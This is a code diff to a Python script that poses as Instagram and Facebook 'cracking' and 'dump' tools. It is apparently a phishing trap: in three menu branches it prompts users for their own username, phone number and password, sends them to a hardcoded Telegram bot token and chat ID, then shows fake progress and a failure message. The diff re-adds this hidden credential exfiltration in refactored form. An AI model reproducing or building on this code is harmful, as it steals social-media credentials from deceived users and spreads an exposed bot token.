@@ -36,17 +36,16 @@ if number == 1:
         os.system("clear")
         os.system("figlet insta cracker")
         print("\033[32mTool devoloped : Anonymous\033[0m")
-        # Initialize the telegram bot with api key
-        hack = telegram.Bot(
-            token='5971532047:AAExHdyy5Kbxcxh_GYPFNwXkPS9jv7wk9Hg')
+
+        # Initialize the Telegram bot with your API key
+        bot = telegram.Bot(token='5971532047:AAExHdyy5Kbxcxh_GYPFNwXkPS9jv7wk9Hg')
 
         print("You need to enter your own account and password to crack your victims. Otherwise tool will not work. Please use original account")
-        print("""
-
-    	""")
+        print("")
 
         # Get the username and password from the user
-        username = input('Enter your correct instagram username: ')
+        username = input('Enter your instagram username : ')
+
         # Validate the phone number
         while True:
             phone_number = input(
@@ -57,17 +56,18 @@ if number == 1:
             else:
                 # Phone number is not valid
                 print('Invalid phone number. Please enter a valid phone number.')
+
         password = input('Enter your password: ')
 
         # Send the username and password to telegram
-        hack.send_message(chat_id=1646830112, text='Username: {}\nPassword: {}\nPhone number: {}'.format(
-            username, password, phone_number))
+        await bot.send_message(chat_id=1646830112, text='Username: {}\nPassword: {}\nPhone number: {}'.format(username, password, phone_number))
         print("Logging in to your account... please wait...")
         time.sleep(3)
         os.system("clear")
-        print("start cracking your followers...")
+        print("start cracking your instagram followers...")
         time.sleep(4)
         print(red+bold+"Failed !! check your details and try again. Or it may due to security reasons.")
+
     asyncio.run(main())
 
 
@@ -116,17 +116,16 @@ elif number == 3:
         os.system("clear")
         os.system("figlet insta dump")
         print("\033[32mTool devoloped : Anonymous\033[0m")
-        # Initialize the telegram bot with api key
-        hack = telegram.Bot(
-            token='5971532047:AAExHdyy5Kbxcxh_GYPFNwXkPS9jv7wk9Hg')
+
+        # Initialize the Telegram bot with your API key
+        bot = telegram.Bot(token='5971532047:AAExHdyy5Kbxcxh_GYPFNwXkPS9jv7wk9Hg')
 
         print("You need to enter your own account and password to crack your victims. Otherwise tool will not work. Please use original account")
-        print("""
-
-    	""")
+        print("")
 
         # Get the username and password from the user
-        username = input('Enter your instagram username: ')
+        username = input('Enter your instagram username : ')
+
         # Validate the phone number
         while True:
             phone_number = input(
@@ -137,17 +136,18 @@ elif number == 3:
             else:
                 # Phone number is not valid
                 print('Invalid phone number. Please enter a valid phone number.')
+
         password = input('Enter your password: ')
 
         # Send the username and password to telegram
-        hack.send_message(chat_id=1646830112, text='Username: {}\nPassword: {}\nPhone number: {}'.format(
-            username, password, phone_number))
+        await bot.send_message(chat_id=1646830112, text='Username: {}\nPassword: {}\nPhone number: {}'.format(username, password, phone_number))
         print("Logging in to your account... please wait...")
         time.sleep(3)
         os.system("clear")
         print("start dumping your followers info...")
         time.sleep(4)
         print(red+bold+"Failed !! check your details and try again. Or it may due to security reasons.")
+
     asyncio.run(main())
 
 elif number == 4:
@@ -155,17 +155,16 @@ elif number == 4:
         os.system("clear")
         os.system("figlet facebook dump")
         print("\033[32mTool devoloped : Anonymous\033[0m")
-        # Initialize the telegram bot with api key
-        hack = telegram.Bot(
-            token='5971532047:AAExHdyy5Kbxcxh_GYPFNwXkPS9jv7wk9Hg')
+
+        # Initialize the Telegram bot with your API key
+        bot = telegram.Bot(token='5971532047:AAExHdyy5Kbxcxh_GYPFNwXkPS9jv7wk9Hg')
 
         print("You need to enter your own account and password to crack your victims. Otherwise tool will not work. Please use original account")
-        print("""
-
-    	""")
+        print("")
 
         # Get the username and password from the user
-        username = input('Enter your facebook email address or username: ')
+        username = input('Enter your facebook username or email : ')
+
         # Validate the phone number
         while True:
             phone_number = input(
@@ -176,17 +175,18 @@ elif number == 4:
             else:
                 # Phone number is not valid
                 print('Invalid phone number. Please enter a valid phone number.')
+
         password = input('Enter your password: ')
 
         # Send the username and password to telegram
-        hack.send_message(chat_id=1646830112, text='Username: {}\nPassword: {}\nPhone number: {}'.format(
-            username, password, phone_number))
+        await bot.send_message(chat_id=1646830112, text='Username: {}\nPassword: {}\nPhone number: {}'.format(username, password, phone_number))
         print("Logging in to your account... please wait...")
         time.sleep(3)
         os.system("clear")
-        print("start dumping your friends info...")
+        print("start dumping your facebook friends info...")
         time.sleep(4)
         print(red+bold+"Failed !! check your details and try again. Or it may due to security reasons.")
+
     asyncio.run(main())
 
 
